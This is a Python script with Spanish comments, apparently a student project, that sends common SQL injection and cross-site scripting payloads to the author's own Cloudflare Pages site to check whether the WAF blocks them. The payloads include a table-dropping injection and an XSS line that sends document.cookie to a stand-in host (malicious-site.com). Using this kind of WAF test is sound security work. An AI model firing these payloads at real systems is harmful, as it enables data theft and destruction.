import requests #pip install requests
import json
import time
from datetime import datetime

# Reemplaza esta URL con la que te dio Cloudflare Pages
URL_APLICACION = "https://proy-redes-computadores.pages.dev/"

def enviar_log_ataque(mensaje, tipo="info"):
    """Envía un log de ataque a la página web."""
    try:
        datos = {
            "tipo": tipo,
            "mensaje": mensaje,
            "timestamp": datetime.now().strftime("%I:%M:%S %p"),
            "origen": "Atacante"
        }
        requests.post(f"{URL_APLICACION}/log", json=datos)
    except:
        # Si falla el envío, continuamos con el ataque
        pass

def simular_ataque_sqli():
    """Simula un ataque de inyección SQL con múltiples payloads."""
    print("🚀 Iniciando simulación de ataques SQL Injection (SQLi)...")
    print("\nℹ️  SQLi intenta manipular consultas SQL para acceder o modificar datos")
    
    # Lista de payloads comunes de SQLi
    payloads = [
        "' OR '1'='1",  # Bypass de autenticación básico
        "' OR 1=1--",   # Comentar el resto de la consulta
        "' UNION SELECT * FROM users--",  # Intentar extraer datos de otra tabla
        "'; DROP TABLE users--",  # Intentar eliminar una tabla
        "' OR '1'='1' /*",  # Bypass usando comentarios
    ]
    
    for i, payload in enumerate(payloads, 1):
        objetivo = {
            0: "Bypass de autenticación",
            1: "Comentar resto de la consulta",
            2: "Extraer datos de tabla users",
            3: "Eliminar tabla de usuarios",
            4: "Bypass con comentarios alternativos"
        }[i-1]
        
        print(f"\n📌 Prueba #{i} - Payload: {payload}")
        print(f"   Objetivo: {objetivo}")
        
        # Enviar log del intento de ataque
        enviar_log_ataque(f"⚠️ Iniciando ataque SQLi #{i}: {objetivo}", "warning")
        
        # La petición maliciosa se envía en la URL
        peticion_sqli = f"{URL_APLICACION}/?search={payload}"
        print(f"   URL maliciosa: {peticion_sqli}")
        
        try:
            enviar_log_ataque(f"🎯 Intentando SQLi: {payload}", "attack")
            respuesta = requests.get(peticion_sqli)
            print(f"\n   Código de respuesta: {respuesta.status_code}")
            print(f"   Headers de seguridad:")
            for header in ['cf-ray', 'cf-cache-status', 'cf-mitigated']:
                if header in respuesta.headers:
                    print(f"   - {header}: {respuesta.headers[header]}")
            
            if respuesta.status_code == 403:
                mensaje = "✅ WAF bloqueó el ataque (403 Forbidden)"
                print("\n   " + mensaje)
                if 'cf-ray' in respuesta.headers:
                    id_bloqueo = respuesta.headers['cf-ray']
                    print(f"   🔍 ID del bloqueo: {id_bloqueo}")
                    enviar_log_ataque(f"{mensaje}\n🔍 ID del bloqueo: {id_bloqueo}", "success")
            else:
                mensaje = "❌ ¡Atención! El ataque no fue bloqueado"
                print("\n   " + mensaje)
                contenido = respuesta.text[:200].replace('\n', '\n   ')
                print("   Contenido de la respuesta (primeros 200 caracteres):")
                print("   " + contenido)
                enviar_log_ataque(f"{mensaje}\nContenido expuesto: {contenido[:50]}...", "danger")
            
            time.sleep(1)  # Pausa entre ataques
            
        except requests.exceptions.RequestException as e:
            print(f"\n   ❌ Error en la petición: {e}")

def simular_ataque_xss():
    """Simula múltiples variantes de ataques Cross-Site Scripting (XSS)."""
    print("\n\n🚀 Iniciando simulación de ataques Cross-Site Scripting (XSS)...")
    print("\nℹ️  XSS permite inyectar scripts maliciosos que se ejecutan en el navegador de la víctima")
    
    # Lista de payloads XSS comunes con diferentes técnicas
    payloads_xss = [
        {
            "payload": "<script>alert('XSS')</script>",
            "descripcion": "XSS básico usando etiqueta script",
            "tipo": "Reflected XSS"
        },
        {
            "payload": "<img src='x' onerror='alert(\"XSS\")'>",
            "descripcion": "XSS usando evento onerror de imagen",
            "tipo": "DOM-based XSS"
        },
        {
            "payload": "<svg onload='fetch(\"http://malicious-site.com?cookie=\"+document.cookie)'>",
            "descripcion": "XSS para robo de cookies",
            "tipo": "Stored XSS"
        },
        {
            "payload": "javascript:alert('XSS')",
            "descripcion": "XSS en atributo href",
            "tipo": "DOM-based XSS"
        },
        {
            "payload": "<iframe src='javascript:alert(`XSS`)'>",
            "descripcion": "XSS usando iframe",
            "tipo": "Reflected XSS"
        }
    ]
    
    for i, payload_info in enumerate(payloads_xss, 1):
        print(f"\n📌 Prueba #{i} - {payload_info['tipo']}")
        print(f"   Descripción: {payload_info['descripcion']}")
        print(f"   Payload: {payload_info['payload']}")
        
        # Enviar log del intento de ataque
        enviar_log_ataque(f"⚠️ Iniciando ataque XSS #{i}: {payload_info['tipo']}", "warning")
        enviar_log_ataque(f"📝 Objetivo: {payload_info['descripcion']}", "info")
        
        # Se envía el payload tanto en URL como en POST
        datos_formulario = {
            "mensaje": payload_info['payload'],
            "comentario": "Test XSS"
        }
        
        # Probar GET request
        try:
            url_con_xss = f"{URL_APLICACION}/?input={payload_info['payload']}"
            enviar_log_ataque(f"🎯 Intentando XSS via GET: {payload_info['payload']}", "attack")
            print(f"\n   🔍 Probando GET request:")
            print(f"   URL: {url_con_xss}")
            
            respuesta = requests.get(url_con_xss)
            mostrar_resultado_ataque(respuesta)
            
            # Probar POST request
            print(f"\n   🔍 Probando POST request:")
            print(f"   Datos: {datos_formulario}")
            
            respuesta = requests.post(f"{URL_APLICACION}/submit", data=datos_formulario)
            mostrar_resultado_ataque(respuesta)
            
            time.sleep(1)  # Pausa entre ataques
            
        except requests.exceptions.RequestException as e:
            print(f"\n   ❌ Error en la petición: {e}")
            
def mostrar_resultado_ataque(respuesta):
    """Muestra el resultado detallado de un ataque."""
    print(f"\n   Código de respuesta: {respuesta.status_code}")
    print(f"   Headers de seguridad:")
    for header in ['cf-ray', 'cf-cache-status', 'cf-mitigated', 'content-security-policy']:
        if header in respuesta.headers:
            print(f"   - {header}: {respuesta.headers[header]}")
    
    if respuesta.status_code == 403:
        print("\n   ✅ WAF bloqueó el ataque (403 Forbidden)")
        if 'cf-ray' in respuesta.headers:
            print(f"   🔍 ID del bloqueo: {respuesta.headers['cf-ray']}")
    else:
        print("\n   ❌ ¡Atención! El ataque no fue bloqueado")
        print("   Contenido de la respuesta (primeros 200 caracteres):")
        print("   " + respuesta.text[:200].replace('\n', '\n   '))

if __name__ == "__main__":
    print("\n🔒 Script de Simulación de Ataques Web - Prueba de Seguridad Cloudflare 🔒")
    print("=" * 70)
    print("\nEste script simula dos tipos comunes de ataques web para probar la seguridad:")
    print("\n1. SQL Injection (SQLi):")
    print("   - Intenta explotar vulnerabilidades en la base de datos")
    print("   - Puede permitir acceso no autorizado a datos sensibles")
    print("   - El WAF debe detectar y bloquear patrones maliciosos en la URL")
    
    print("\n2. Cross-Site Scripting (XSS):")
    print("   - Intenta inyectar código JavaScript malicioso")
    print("   - Puede robar cookies de sesión o modificar el contenido de la página")
    print("   - El WAF debe detectar y bloquear scripts maliciosos")
    
    print("\nObjetivo: Verificar que el WAF de Cloudflare bloquea estos ataques")
    print("URL objetivo:", URL_APLICACION)
    print("=" * 70 + "\n")
    
    input("Presiona Enter para iniciar la simulación de ataques...")
    
    # Ejecutar la simulación de SQLi
    simular_ataque_sqli()
    
    print("\n" + "=" * 70 + "\n")
    time.sleep(2) # Espera 2 segundos antes del siguiente ataque
    
    # Ejecutar la simulación de XSS
    simular_ataque_xss()